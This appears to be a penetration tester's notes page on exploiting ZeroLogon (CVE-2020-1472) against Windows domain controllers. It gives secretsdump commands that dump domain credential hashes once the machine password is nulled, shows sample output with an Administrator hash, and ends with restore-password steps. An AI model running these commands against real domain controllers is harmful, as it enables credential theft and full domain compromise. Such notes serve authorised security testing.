---
description: CVE-2020-1472
---

# 🧙‍♀️ Abusing ZeroLogon

<figure><img src="../../.gitbook/assets/image (1041).png" alt=""><figcaption></figcaption></figure>

Github: [https://github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)

Zerologon is a vulnerability in the cryptography of Microsoft’s Netlogon process that allows an attack against Microsoft Active Directory domain controllers. Zerologon makes it possible for a hacker to impersonate any computer, including the root domain controller.

{% embed url="https://www.trendmicro.com/en_us/what-is/zerologon.html" %}

#### Methodology:

I took the pictures on this GitHub:

{% embed url="https://0xss0rz.github.io/2021-05-31-ZeroLogon/" %}

Since Zerologon is a very dangerous exploit that can cause damage to a DC, it's best to just run the check script and notify your client:

<figure><img src="../../.gitbook/assets/image (1042).png" alt=""><figcaption></figcaption></figure>

But if we ever need to try this attack, here are the steps ->

If the target is vulnerable, we just need to throw in the following command:

<figure><img src="../../.gitbook/assets/image (1043).png" alt=""><figcaption></figcaption></figure>

This will lead to putting the passwords to null, thus enabling us to be able to dump anything on the DC:

```
secretsdump.py -just-dc -no-pass DC01\$@10.10.181.126
```

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3f3ef89114fb063e3d7fc23c20f65568:::
[...]
```

Then we could technically do anything we want on the DC like getting a shell:

<figure><img src="../../.gitbook/assets/image (1044).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
We quicly need to restore the domain credentials after performing this attack
{% endhint %}

To restore the password and the overall "integrity" of the domain, these are the following steps:

```
secretsdump.py username@IP_of_DC -hashes hash_of_user
```

Now we need to look for this variable in the output, the plan\_password\_hex:

<figure><img src="../../.gitbook/assets/image (1045).png" alt=""><figcaption></figcaption></figure>

and to restore the previous state that was stable, we can run the integrated script that zerologon provides; This will first authenticate with the empty password to the same DC and then set the password back to the original one.:

```
restorepassword.py testsegment/s2016dc@s2016dc -target-ip 192.168.222.113 -hexpass e6ad4c4f64e71cf8c8020aa44bbd70ee711b8dce2adecd7e0d7fd1d76d70a848c987450c5be97b230bd144f3c3...etc
```
